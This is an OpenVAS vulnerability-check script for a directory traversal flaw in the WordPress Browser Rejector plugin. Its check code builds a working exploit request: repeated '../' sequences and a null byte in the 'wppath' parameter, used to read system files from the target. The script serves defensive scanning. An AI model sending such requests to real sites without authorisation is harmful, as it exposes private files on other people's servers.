###############################################################################
# OpenVAS Vulnerability Test
#
# WordPress Browser Rejector Plugin Remote File Inclusion Vulnerability
#
# Authors:
# Rachana Shetty <srachana@secpod.com>
#
# Copyright:
# Copyright (C) 2013 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.803209");
  script_version("2023-03-01T10:20:04+0000");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"2023-03-01 10:20:04 +0000 (Wed, 01 Mar 2023)");
  script_tag(name:"creation_date", value:"2013-01-17 14:17:27 +0530 (Thu, 17 Jan 2013)");
  script_name("WordPress Browser Rejector Plugin Remote File Inclusion Vulnerability");

  script_xref(name:"URL", value:"http://secunia.com/advisories/51739/");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/57220");
  script_xref(name:"URL", value:"http://plugins.trac.wordpress.org/changeset/648432/browser-rejector");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2013 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_wordpress_http_detect.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("wordpress/http/detected");

  script_tag(name:"summary", value:"WordPress Browser Rejector Plugin is prone to a remote file
  inclusion vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"impact", value:"Successful exploitation will allow attackers to perform directory
  traversal attacks and read arbitrary files on the affected application.");

  script_tag(name:"affected", value:"Browser Rejector Plugin version 2.10 and prior.");

  script_tag(name:"insight", value:"The flaw is due to an improper validation of user supplied input
  to the 'wppath' parameter in 'wp-content/plugins/browser-rejector/rejectr.js.php', which allows
  attackers to read arbitrary files via a ../(dot dot) sequences.");

  script_tag(name:"solution", value:"Update to WordPress Browser Rejector Plugin version 2.11 or
  later.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("misc_func.inc");
include("http_func.inc");
include("host_details.inc");
include("os_func.inc");
include("http_keepalive.inc");

if(!port = get_app_port(cpe:CPE, service:"www"))
  exit(0);

if(!dir = get_app_location(cpe:CPE, port:port))
  exit(0);

if(dir == "/")
  dir = "";

files = traversal_files();

foreach file(keys(files)) {

  url = string(dir, "/wp-content/plugins/browser-rejector/rejectr.js.php?wppath=", crap(data:"../",length:3*15), files[file], "%00");

  if(http_vuln_check(port:port, url:url, pattern:file)) {
    report = http_report_vuln_url(port:port, url:url);
    security_message(port:port, data:report);
    exit(0);
  }
}

exit(99);
